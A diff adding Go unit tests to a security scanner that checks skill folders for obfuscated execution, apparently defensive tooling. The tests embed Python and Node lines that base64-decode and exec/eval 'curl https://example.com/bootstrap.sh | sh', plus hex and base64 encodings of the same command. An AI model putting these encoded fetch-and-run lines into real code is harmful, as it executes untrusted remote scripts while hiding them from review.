@@ -335,6 +335,22 @@ bash -c "$(
 	assertHasID(t, findings, "CURL_PIPE_SHELL")
 }
 
+func TestScanSkillRootDetectsLocalBase64DecodeExecPatterns(t *testing.T) {
+	root := t.TempDir()
+	content := `exec(base64.b64decode("Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2Jvb3RzdHJhcC5zaCB8IHNo").decode())
+eval(atob("Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2Jvb3RzdHJhcC5zaCB8IHNo"))
+`
+	if err := os.WriteFile(filepath.Join(root, "run.py"), []byte(content), 0o644); err != nil {
+		t.Fatalf("write run.py: %v", err)
+	}
+
+	findings, err := ScanSkillRoot(root)
+	if err != nil {
+		t.Fatalf("ScanSkillRoot() error = %v", err)
+	}
+	assertHasID(t, findings, "BASE64_PIPE_EXEC")
+}
+
 func TestDecodedPayloadHelpers(t *testing.T) {
 	t.Run("extractEncodedCandidates finds base64 and hex candidates", func(t *testing.T) {
 		line := "a WTNWeWJDQm9kSFJ3Y3pvdkwyVjRZVzF3YkdVdVkyOXRMMkp2YjNSemRISmhjQzV6YUNCOElITm8= b 6375726c2068747470733a2f2f6578616d706c652e636f6d2f626f6f7473747261702e7368207c207368"
@@ -792,6 +808,34 @@ func TestDecodedSubshellExecPatterns(t *testing.T) {
 		line := `$h='6375726c'; $s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromHexString($h)); Write-Output $s`
 		if powerShellFromHexExecPattern.MatchString(line) {
 			t.Fatalf("unexpected powerShellFromHexExecPattern match for %q", line)
+		}
+	})
+
+	t.Run("detects python base64 decode routed to exec", func(t *testing.T) {
+		line := `exec(base64.b64decode("Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2Jvb3RzdHJhcC5zaCB8IHNo").decode())`
+		if !pythonBase64ExecPattern.MatchString(line) {
+			t.Fatalf("expected pythonBase64ExecPattern to match %q", line)
+		}
+	})
+
+	t.Run("does not match python base64 decode without exec/eval", func(t *testing.T) {
+		line := `payload = base64.b64decode("Y3VybA==").decode()`
+		if pythonBase64ExecPattern.MatchString(line) {
+			t.Fatalf("unexpected pythonBase64ExecPattern match for %q", line)
+		}
+	})
+
+	t.Run("detects node atob decode routed to eval", func(t *testing.T) {
+		line := `eval(atob("Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2Jvb3RzdHJhcC5zaCB8IHNo"))`
+		if !nodeBase64EvalPattern.MatchString(line) {
+			t.Fatalf("expected nodeBase64EvalPattern to match %q", line)
+		}
+	})
+
+	t.Run("does not match node base64 decode without eval", func(t *testing.T) {
+		line := `const payload = atob("Y3VybA==")`
+		if nodeBase64EvalPattern.MatchString(line) {
+			t.Fatalf("unexpected nodeBase64EvalPattern match for %q", line)
 		}
 	})
 }
